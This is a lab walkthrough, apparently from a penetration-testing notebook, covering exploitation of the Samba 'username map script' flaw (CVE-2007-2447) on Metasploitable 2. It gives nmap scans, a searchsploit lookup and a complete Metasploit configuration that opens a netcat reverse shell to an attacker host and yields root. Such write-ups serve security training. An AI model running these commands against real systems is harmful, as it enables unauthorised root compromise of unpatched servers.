# 📦 SMB – CVE-2007-2447 Root Shell Exploit

> This section covers the discovery and exploitation of a Samba vulnerability on Metasploitable 2 using CVE-2007-2447 to gain root access.

---

## 🔍 Service Discovery

```bash
nmap -sV -sC -p 445 192.168.182.128
```

📌 Output:
- Service: Samba smbd 3.0.20-Debian

---

## 🧪 Step 1: SMB Nmap Scripts

```bash
nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-os-discovery,smb-vuln* 192.168.182.128
```

📌 Highlights:
- Anonymous access allowed on `IPC$` and `/tmp`
- OS: Debian with Samba 3.0.20
- Detected vulnerable behavior

---

## 🔎 Step 2: Vulnerability Research

```bash
searchsploit Samba 3.0.20
```

📌 Found:
- `Samba 3.0.20 - 'username map script' Command Execution`
- CVE: CVE-2007-2447

---

## 💥 Step 3: Metasploit Exploit

```bash
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.182.128
set RPORT 139
set LHOST 192.168.182.129
set LPORT 4444
set PAYLOAD cmd/unix/reverse_netcat
run
```

📌 Result:
```bash
[*] Command shell session 1 opened (192.168.182.129:4444 → 192.168.182.128)
```

---

## 🧠 Step 4: Post-Exploitation

```bash
whoami
→ root
```

✅ Root-level shell obtained.

---

## 🔐 Summary

| Element       | Details                            |
|---------------|-------------------------------------|
| Service       | Samba smbd 3.0.20                   |
| Vulnerability | CVE-2007-2447                       |
| Exploit       | `exploit/multi/samba/usermap_script` |
| Shell Type    | Netcat reverse shell                |
| User          | root                                |


